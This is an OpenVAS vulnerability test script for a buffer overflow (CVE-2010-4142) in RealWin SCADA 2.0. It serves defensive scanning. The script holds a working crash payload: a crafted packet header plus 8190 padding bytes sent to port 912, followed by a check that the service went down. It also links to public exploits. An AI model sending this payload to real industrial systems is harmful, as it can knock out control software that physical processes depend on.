###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_realwin_scada_bof_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# RealWin SCADA System Buffer Overflow Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  on the system or cause a denial of service condition.
  Impact Level: Application";
tag_affected = "RealWin SCADA System 2.0 Build 6.1.8.10 and prior.";
tag_insight = "The flaws are due to a boundary errors when processing 'SCPC_INITIALIZE',
  'SCPC_INITIALIZE_RF' and 'SCPC_TXTEVENT' packets that can be exploited to
  cause a stack-based buffer overflow by sending specially crafted packets to
  port 912/TCP.";
tag_solution = "No solution or patch is available as of 04th November 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.realflex.com/products/realwin/realwin.php";
tag_summary = "This host is running RealWin SCADA system and is prone to buffer
  overflow vulnerabilities.";

if(description)
{
  script_id(801622);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)");
  script_bugtraq_id(44150);
  script_cve_id("CVE-2010-4142");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_name("RealWin SCADA System Buffer Overflow Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41849");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15259/");
  script_xref(name : "URL" , value : "http://downloads.securityfocus.com/vulnerabilities/exploits/44150-1.rb");

  script_description(desc);
  script_summary("Determine RealWin SCADA System Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(912);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

## Default Realwin Port
port = 912;
if(!get_port_state(port)){
  exit(0);
}

head = raw_string(0x64, 0x12, 0x54, 0x6A, 0x20, 0x00, 0x00, 0x00,
                   0xF4, 0x1F, 0x00, 0x00);

junk = crap(data:"a", length: 8190);
junk += raw_string(0x00);

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc) exit(0);

## Sending payload
send(socket:soc, data: head + junk);
close(soc);

sleep(5);

## Check Port status
soc = open_sock_tcp(port);
if(!soc){
 security_hole(port);
}
